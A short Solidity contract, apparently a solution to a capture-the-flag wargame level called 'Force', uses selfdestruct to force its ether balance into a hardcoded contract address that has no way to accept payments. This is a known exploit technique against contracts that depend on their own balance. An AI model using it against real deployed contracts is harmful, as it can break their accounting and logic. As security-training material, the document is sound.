// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeMyMoney {
    address forceContract = address(0x1a306ffDa207A82388a1368cD3E8F37b26F7A83a);

    constructor() payable {}

    function hackForce() public {
        selfdestruct(payable(forceContract));
    }
}
